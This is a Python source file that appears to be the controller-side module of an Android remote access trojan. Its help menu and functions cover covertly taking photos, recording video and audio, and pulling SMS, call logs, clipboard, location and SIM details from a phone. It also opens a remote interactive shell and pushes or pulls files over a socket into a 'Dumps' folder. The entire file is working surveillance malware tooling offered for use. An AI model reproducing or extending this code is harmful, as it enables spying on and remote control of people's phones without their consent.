import sys
import os
import base64
import time
import binascii
import select
import pathlib
import platform
import re
from subprocess import PIPE, run

if(platform.system() == 'Windows'):
    clear = lambda: os.system('cls')
else:
    clear = lambda: os.system('clear')

if not os.path.isdir(os.getcwd()+"\\Dumps"):
    os.makedirs("Dumps")


def is_valid_ip(ip):
    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
    return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))

def is_valid_port(port):
    i = 1 if port.isdigit() and len(port)>1  else  0
    return i

def executeCMD(command):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    return result


def getpwd(name):
	return os.getcwd()+"\\"+name;

def help():
    helper="""
    Usage:
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a interactive shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
    """
    print(helper)

def getImage(client):
    print("Taking Image")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    flag=0
    filename ="Dumps\\Image_"+timestr+'.jpg'
    imageBuffer=recvall(client) 
    imageBuffer = imageBuffer.strip().replace("END123","").strip()
    if imageBuffer=="":
        print("Unable to Connect to Camera\n")
        return
    with open(filename,'wb') as img:    
        try:
            imgdata = base64.b64decode(imageBuffer)
            img.write(imgdata)
            print("Succesfully Saved in "+getpwd(filename)+"\n")
        except binascii.Error as e:
            flag=1
            print(e)
            print("Not able to decode the Image\n")
    if flag == 1:
        os.remove(filename)

def readSMS(client,data):
    print("Getting "+data+" SMS")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "Dumps\\"+data+"_"+timestr+'.txt'
    flag =0
    with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
        msg = recvall(client)
        try:
            txt.write(msg)
            print("Succesfully Saved in "+getpwd(filename)+"\n")
        except UnicodeDecodeError:
            flag = 1
            print("Not able to decode the SMS\n")
    if flag == 1:
    	os.remove(filename)

def getFile(filename,ext,data):
    fileData = "Dumps\\"+filename+"."+ext
    flag=0
    with open(fileData, 'wb') as file:
        try:
            rawFile = base64.b64decode(data)
            file.write(rawFile)
            print("Succesfully Downloaded in "+getpwd(fileData))
        except binascii.Error:
            flag=1
            print("Not able to decode the Audio File")
    if flag == 1:
        os.remove(filename)

def putFile(filename):
    data = open(filename, "rb").read()
    encoded = base64.b64encode(data)
    return encoded

def shell(client):
    msg = "start"
    command = "ad"
    while True:
        msg = recvallShell(client)
        if "getFile" in msg:
            msg=" "
            msg1 = recvall(client)
            msg1 = msg1.replace("\nEND123\n","")
            filedata = msg1.split("|_|")
            getFile(filedata[0],filedata[1],filedata[2])
            
        if "putFile" in msg:
            msg=" "
            sendingData=""
            filename = command.split(" ")[1].strip()
            file = pathlib.Path(filename)
            if file.exists():
                encoded_data = putFile(filename).decode("UTF-8")
                filedata = filename.split(".")
                sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                client.send(sendingData.encode("UTF-8"))
                print(f"Succesfully Uploaded the file {filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
            else:
                print ("File not exist")

        if "Exiting" in msg:
            print("----------Exiting Shell----------\n")
            return
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)   
        print(" ")
        command = input("android@shell:~$ ")
        command = command+"\n"
        if command.strip() == "clear":
            client.send("test\n".encode("UTF-8"))
            clear()
        else:
            client.send(command.encode("UTF-8"))        

def getLocation(sock):
    msg = "start"
    while True:
        msg = recvall(sock)
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)   
        if("END123" in msg):
            return
        print(" ")     

def recvall(sock):
    buff=""
    data = ""
    while "END123" not in data:
        data = sock.recv(4096).decode("UTF-8","ignore")
        buff+=data
    return buff


def recvallShell(sock):
    buff=""
    data = ""
    ready = select.select([sock], [], [], 3)
    while "END123" not in data:
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8","ignore")
            buff+=data
        else:
            buff="bogus"
            return buff
    return buff

def stopAudio(client):
    print("Downloading Audio")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag =0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps\\Audio_"+timestr+".mp4"
    with open(filename, 'wb') as audio:
        try:
            audioData = base64.b64decode(data)
            audio.write(audioData)
            print("Succesfully Saved in "+getpwd(filename))
        except binascii.Error:
            flag=1
            print("Not able to decode the Audio File")
    print(" ")
    if flag == 1:
        os.remove(filename)


def stopVideo(client):
    print("Downloading Video")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag=0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps\\Video_"+timestr+'.mp4' 
    with open(filename, 'wb') as video:
        try:
            videoData = base64.b64decode(data)
            video.write(videoData)
            print("Succesfully Saved in "+getpwd(filename)+"\n")
        except binascii.Error:
            flag = 1
            print("Not able to decode the Video File\n")
    if flag == 1:
        os.remove("Video_"+timestr+'.mp4')

def callLogs(client):
    print("Getting Call Logs")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = "Dumps\\Call_Logs_"+timestr+'.txt'
    if "No call logs" in msg:
    	msg.split("\n")
    	print(msg.replace("END123","").strip())
    	print(" ")
    else:
    	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
    		txt.write(msg)
    		txt.close()
    		print("Succesfully Saved in "+getpwd(filename)+"\n")
    		if not os.path.getsize(filename):
    			os.remove(filename)